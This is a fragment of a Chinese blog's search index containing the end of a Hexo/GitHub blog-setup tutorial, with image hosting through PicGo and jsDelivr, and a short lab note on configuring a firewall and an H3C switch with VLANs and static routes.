class="line"><span class="attr">date:</span> <span class="number">2013</span><span class="string">/7/13</span> <span class="number">20</span><span class="string">:46:25</span> <span class="comment"># 文件创建的时间</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></tbody></table></figure><p>在Typora中我们在md文件的首行（必须是第一行）输入— ，然后按回车就可以插入Front-matter了。</p><p><strong>为文章添加分类与标签</strong><br>只有文章（post布局）支持分类和标签，需要在Front-matter中设置。分类有层级关系，标签没有。</p><figure class="highlight subunit"><table><tbody><tr><td class="code"><pre><span class="line">categories:</span><br><span class="line">- 个人博客（第一层级）</span><br><span class="line">- Hexo博客（第二层级）</span><br><span class="line"><span class="keyword">tags:</span></span><br><span class="line">- Hexo</span><br><span class="line">- 博客</span><br></pre></td></tr></tbody></table></figure><p><strong>为文章添加多个分类</strong></p><figure class="highlight asciidoc"><table><tbody><tr><td class="code"><pre><span class="line">categories:</span><br><span class="line"><span class="bullet">- </span>[日常, 生活]</span><br><span class="line"><span class="bullet">- </span>[日常, 随想]</span><br><span class="line"><span class="bullet">- </span>[日记]</span><br></pre></td></tr></tbody></table></figure><p>一般发布文章或者修改博客后需要这些操作：清除缓存&gt;生成静态文件&gt;启动服务器，测试没问题后再部署。</p><figure class="highlight elixir"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br><span class="line"><span class="variable">$ </span>hexo d</span><br></pre></td></tr></tbody></table></figure><h3 id="本地图片部署和展示问题"><a href="#本地图片部署和展示问题" class="headerlink" title="本地图片部署和展示问题"></a>本地图片部署和展示问题</h3><ol><li>安装插件<br>npm install <a href="https://github.com/7ym0n/hexo-asset-image">https://github.com/7ym0n/hexo-asset-image</a> –save</li></ol><p>不要安装网上的npm install <a href="https://github.com/CodeFalling/hexo-asset-image">https://github.com/CodeFalling/hexo-asset-image</a> –save</p><ol start="2"><li>配置<br>在 _config.yml 配置文件中修改 post_asset_folder 属性为 true<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/7e8d8a68d44e471da24ed783ed49d470.png"></li></ol><p><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/2f48ac461dca43afa689d28917122803.png"></p><h4 id="图片引用"><a href="#图片引用" class="headerlink" title="图片引用"></a>图片引用</h4><p>文件目录如下</p><figure class="highlight gherkin"><table><tbody><tr><td class="code"><pre><span class="line">|<span class="string">- _post  </span></span><br><span class="line"><span class="string"></span>|<span class="string">    </span>|<span class="string">- _resource</span></span><br><span class="line"><span class="string"></span>|<span class="string">    </span>|<span class="string">    </span>|<span class="string">- hexo.png</span></span><br><span class="line"><span class="string"></span>|<span class="string">    </span>|<span class="string">- article  </span></span><br><span class="line"><span class="string"></span>|<span class="string">    </span>|<span class="string">    </span>|<span class="string">- hexo.png  </span></span><br><span class="line"><span class="string"></span>|<span class="string">    </span>|<span class="string">- article.md</span></span><br></pre></td></tr></tbody></table></figure><ol><li>直接使用代码<code>![](hexo.png)</code>（虽然没有写文件夹的名字，但是可以的），hexo.png 是我们存在 article 文件夹内的图片。这时你会发现markdown预览中无法显示这张图片，但是当你将博客上传到网站时，网站上是可以正常显示的。</li><li>使用代码 <img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/hexo.png">不仅可以本地预览，上传到网站也可以正常显示。</li><li>本地无法预览也是件很不舒服的事情，其实我们还可以另外创建一个文件夹 pictures ，里面专门存放所有文章的图片，代码 <img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/hexo.png"> 不仅可以本地预览，上传到网站也可以正常显示。</li></ol><p><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/f818a8e4e3444c57ab7fd17ec48f0915.png"></p><h3 id="使用图床"><a href="#使用图床" class="headerlink" title="使用图床"></a>使用图床</h3><p>使用 GitHub + PicGo + jsDelivr 搭建自己的私人图床</p><ul><li>Snipaste： win下用了几年的开源截图软件，非常强大</li><li>Typora：常用Markdown编辑器</li><li>Picgo：多图床整合工具<h4 id="GitHub上创建一个存储库"><a href="#GitHub上创建一个存储库" class="headerlink" title="GitHub上创建一个存储库"></a>GitHub上创建一个存储库</h4>添加一个存储库（New repositories）命名为：leaves_img，用于上传图片文件。<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/cd7adac81b9645278b59bfb536caaa49.png"></li></ul><h4 id="使用PicGo客户端"><a href="#使用PicGo客户端" class="headerlink" title="使用PicGo客户端"></a>使用PicGo客户端</h4><ol><li>准备工作<br>（1）images存储库分支选master<br>在images存储库点击Settings:</li></ol><p><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/e125f7bc621945e9b3ddba414e4a7194.png"></p><p>分支选master branch<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/e392fd1da47e4ecab25fd160d5b53a59.png"><br>2. 配置token key<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/ea1d105aeb2e413aa01f313522f348d5.png"></p><p><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/6f4f697727e74cdf834ba3e0741727f4.png"></p><h4 id="配置PicGo"><a href="#配置PicGo" class="headerlink" title="配置PicGo"></a>配置PicGo</h4><p>下载 PicGo<br><a href="https://github.com/Molunerfinn/picgo/releases">https://github.com/Molunerfinn/picgo/releases</a><br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/c18e412f9c204b4891bb7f394f107052.png"></p><ul><li>设定仓库名：按照【用户名 / 图床仓库名】的格式填写</li><li>设定分支名：【 master 】</li><li>设定 Token：粘贴上述生成的【 Token 】</li><li>指定存储路径：填写想要储存的路径，如【 img/ 】，这样就会在仓库下创建一个名为 img 的文件夹，图片将会储存在此文件夹中</li><li>设定自定义域名：它的的作用是，在图片上传后，PicGo 会按照【 自定义域名 + 上传的图片名 】的方式生成访问链接，放到粘贴板上，因为我们要使用 jsDelivr 加速访问，所以可以设置为 <a href="https://cdn.jsdelivr.net/gh/%E7%94%A8%E6%88%B7%E5%90%8D/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93%E5%90%8D">https://cdn.jsdelivr.net/gh/用户名/图床仓库名</a></li></ul><p>搭建完成上传</p><p><a href="https://cdn.jsdelivr.net/gh/">https://cdn.jsdelivr.net/gh/</a>&lt;你的github用户名&gt;/&lt;你的图床仓库名&gt;@&lt;仓库版本号&gt;/图片的路径<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/4f152564eb404a2284e249c7c1cba615.png"><br><code>![](https://cdn.jsdelivr.net/gh/GreenLeavesl/leaves_img/img/R-C.jpg)</code></p><h4 id="Typora配置图片自动上传"><a href="#Typora配置图片自动上传" class="headerlink" title="Typora配置图片自动上传"></a>Typora配置图片自动上传</h4><p>确保版本号在 0.9.84 之后</p><p>选择图像。在上传服务，选择 PicGo(app)。PicGo路径，选择PicGo软件的安装路径。然后点击验证图片上传选项。上边的插入图片选择无特殊操作即可。<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/65ec0be5f12248ffa67b47a0962444b8.png"><br>验证成功之后是下图这个样子，屏幕右下角也会有浮窗提示。<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/b461cda97ac04cf5830c981e3a3c0726.png"><br>然后 PicGo 的相册中就多了两个此次测试的图片。</p><p>测试配置是否成功</p><p>上传成功后就是生成的图片连接<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/63b886c417584be993161a693178a15b.png"></p><p>指定路径</p><p><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/eed030c9680648138432dc7adefd5472.png"></p><h3 id="删除博客"><a href="#删除博客" class="headerlink" title="删除博客"></a>删除博客</h3><p>如果删除对应文章后，hexo clean &amp;&amp; hexo g &amp;&amp; hexo s和hexo d不起左右，则使用以下方法</p><figure class="highlight jboss-cli"><table><tbody><tr><td class="code"><pre><span class="line">第一步，去文件夹source/_posts下删除你想要删除的文章</span><br><span class="line">第二步，删除<span class="string">.deploy_git</span>文件夹</span><br><span class="line"><span class="string">.deploy_git</span>是git部署用的文件。当你为 git 部署选项运行hexo d命令时，Hexo 会创建一个名为<span class="string">.deploy_git</span>的文件夹，并将生成的文件复制到该文件夹。</span><br><span class="line">第三步，执行hexo clean后，再执行hexo g，hexo g 即可。</span><br><span class="line">发现文章删除成功</span><br></pre></td></tr></tbody></table></figure><h2 id="排坑"><a href="#排坑" class="headerlink" title="排坑"></a>排坑</h2><ol><li>新建默认博客_post报yaml格式错误</li></ol><p><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/f372c13b045b40b2a8a0b3c00457248d.png"><br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/a7c6dd53e47748479e4a405347dbe0c5.png"><br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/16794735a7a748da9de0d865e9488cb5.png"><br>删除后正常（如果标题中有空格，应用””号括起来，如hexo n “hello world”）<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/b7fbbfef0dbd478e8d879871573c1d34.png"></p><ol start="2"><li>如果github项目私有无法部署gitpage，请改回公开</li></ol><p>在对应的repository的page设置为你hexo的_config.yml里设置的branch<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/6a48cfa8185a4dbeae0c323c9cacef18.png"></p><p>补充：在_config中设置完全一致的repository的github/gitee项目名可以减少很多麻烦</p><p><strong>参考文章：</strong><br><a href="https://blog.csdn.net/nightmare_dimple/article/details/86661514">https://blog.csdn.net/nightmare_dimple/article/details/86661514</a><br><a href="https://cloud.tencent.com/developer/article/1046404">https://cloud.tencent.com/developer/article/1046404</a><br><a href="https://blog.csdn.net/qq_41684957/article/details/90680765">https://blog.csdn.net/qq_41684957/article/details/90680765</a><br><a href="https://blog.csdn.net/qq_34243930/article/details/109046120">https://blog.csdn.net/qq_34243930/article/details/109046120</a><br><a href="https://post.smzdm.com/p/alxd60g0/">https://post.smzdm.com/p/alxd60g0/</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网防火墙交换机设置实验</title>
      <link href="/2021/08/03/%E5%86%85%E7%BD%91%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A4%E6%8D%A2%E6%9C%BA%E8%AE%BE%E7%BD%AE%E5%AE%9E%E9%AA%8C/"/>
      <url>/2021/08/03/%E5%86%85%E7%BD%91%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A4%E6%8D%A2%E6%9C%BA%E8%AE%BE%E7%BD%AE%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="内网防火墙交换机设置实验"><a href="#内网防火墙交换机设置实验" class="headerlink" title="内网防火墙交换机设置实验"></a>内网防火墙交换机设置实验</h1><p>内网nat模拟外网环境</p><p>nat映射ip 192.168.20.155</p><h2 id="绿盟防火墙"><a href="#绿盟防火墙" class="headerlink" title="绿盟防火墙"></a>绿盟防火墙</h2><p>将自己的以太网网址修改为192.168.1.0/24<br>weboper<br>密码</p><p><a href="https://192.168.1.1/">https://192.168.1.1/</a><br><img src="/2021/08/03/%E5%86%85%E7%BD%91%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A4%E6%8D%A2%E6%9C%BA%E8%AE%BE%E7%BD%AE%E5%AE%9E%E9%AA%8C/f8ed5a7a2fb04497bc5141d87af81462.png"></p><p><img src="/2021/08/03/%E5%86%85%E7%BD%91%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A4%E6%8D%A2%E6%9C%BA%E8%AE%BE%E7%BD%AE%E5%AE%9E%E9%AA%8C/712f7819e323409883f76525479fd954.png"></p><p><img src="/2021/08/03/%E5%86%85%E7%BD%91%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A4%E6%8D%A2%E6%9C%BA%E8%AE%BE%E7%BD%AE%E5%AE%9E%E9%AA%8C/697c73caf1e94fa68a4cf2c92f5f083e.png"></p><p>设置静态路由<br><img src="/2021/08/03/%E5%86%85%E7%BD%91%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A4%E6%8D%A2%E6%9C%BA%E8%AE%BE%E7%BD%AE%E5%AE%9E%E9%AA%8C/14d0ae3a1a5b4d96ad3d3c191ef5255d.png"></p><h2 id="华为交换机H3Cws5800设置"><a href="#华为交换机H3Cws5800设置" class="headerlink" title="华为交换机H3Cws5800设置"></a>华为交换机H3Cws5800设置</h2><p>将自己的以太网网址修改为192.168.0.0/24</p><p>访问<br><a href="http://192.168.0.233/">http://192.168.0.233/</a></p><p>admin<br>admin</p><p>划分vlan100,10,20<br>分别对应ip192.168.100.2/24（连接防火墙接口）<br>10.10.10.1/24<br>10.10.20.1/24<br>默认网关为10.10.10.1和10.10.20.1</p><p><img src="/2021/08/03/%E5%86%85%E7%BD%91%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A4%E6%8D%A2%E6%9C%BA%E8%AE%BE%E7%BD%AE%E5%AE%9E%E9%AA%8C/b740106e4181402f9f3486ec4d5faed6.png"></p><p><img src="/2021/08/03/%E5%86%85%E7%BD%91%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A4%E6%8D%A2%E6%9C%BA%E8%AE%BE%E7%BD%AE%E5%AE%9E%E9%AA%8C/c19c3b453965486aa73827232d0eaf01.png"></p><p><img src="/2021/08/03/%E5%86%85%E7%BD%91%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A4%E6%8D%A2%E6%9C%BA%E8%AE%BE%E7%BD%AE%E5%AE%9E%E9%AA%8C/a3efd5649fba46179b6488262ee7464c.png"></p><p><img src="/2021/08/03/%E5%86%85%E7%BD%91%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A4%E6%8D%A2%E6%9C%BA%E8%AE%BE%E7%BD%AE%E5%AE%9E%E9%AA%8C/a962b43e3a694744889d713e368bdf98.png"></p><p><img src="/2021/08/03/%E5%86%85%E7%BD%91%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A4%E6%8D%A2%E6%9C%BA%E8%AE%BE%E7%BD%AE%E5%AE%9E%E9%AA%8C/2371d1da87cd425cb7c449365ae0dc7e.png"></p><p><img src="/2021/08/03/%E5%86%85%E7%BD%91%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A4%E6%8D%A2%E6%9C%BA%E8%AE%BE%E7%BD%AE%E5%AE%9E%E9%AA%8C/30d8e32e5a5645e8a234e1cf04788e6c.png"></p><p><img src="/2021/08/03/%E5%86%85%E7%BD%91%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A4%E6%8D%A2%E6%9C%BA%E8%AE%BE%E7%BD%AE%E5%AE%9E%E9%AA%8C/23c95a629576435ea06c0774f9c4401e.png"></p><p>静态路由设置<br><img src="/2021/08/03/%E5%86%85%E7%BD%91%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A4%E6%8D%A2%E6%9C%BA%E8%AE%BE%E7%BD%AE%E5%AE%9E%E9%AA%8C/db513b4467b24fd99547fc6959768063.png"></p><p>命令配置步骤</p><p>创建VLAN 100，并将GigabitEthernet 1/0/1加入VLAN 100。</p><figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">system</span>-view</span><br><span class="line"><span class="attribute">vlan</span> <span class="number">100</span></span><br><span class="line"><span class="attribute">port</span> gigabitethernet <span class="number">1</span>/<span class="number">0</span>/<span class="number">1</span></span><br><span class="line"><span class="attribute">quit</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>创建Vlan-interface 100，并配置其IP地址为192.168.100.2/24。</p><figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">interface</span> Vlan-interface <span class="number">100</span></span><br><span class="line"><span class="attribute">ip</span> address <span class="number">192.168.100.2</span> <span class="number">24</span></span><br><span class="line"><span class="attribute">quit</span> </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 防火墙 </tag>
            
            <tag> 交换机 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
